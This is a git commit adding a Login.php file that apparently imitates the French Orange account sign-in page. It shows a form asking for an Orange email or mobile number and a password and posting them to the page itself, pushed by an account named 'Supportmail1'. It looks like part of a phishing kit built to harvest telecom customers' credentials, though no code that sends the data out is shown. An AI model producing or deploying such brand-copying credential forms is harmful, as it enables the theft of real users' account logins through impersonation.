95607844f3e342a6f3baa634e0f92ba51b99dfd9
Supportmail1 <83602877+Supportmail1@users.noreply.github.com>
2021-05-03 16:55:28 +0000

    Add files via upload

---
+++ Login.php
@@ -0,0 +1,22 @@
+<section class="login-container">
+        <div>
+            <header>
+               <h1 data-testid="pageTitle" color="black" class="sc-dIUggk kPwTYk">Pour vous identifier</h1>
+              
+            <h2>Indiquez votre compte Orange
+
+</h2> 
+            </header>
+
+            <form action="" method="post">
+              
+                <input type="text" name="username" placeholder="Adresse e-mail ou n° de mobile Orange
+" required="required"/>
+                <input type="password" name="password" placeholder="Mot de passe" required="required"/>
+                <button type="submit">S'identifier</button>
+
+            </form>
+        </div>
+    </section>
+
+</div>
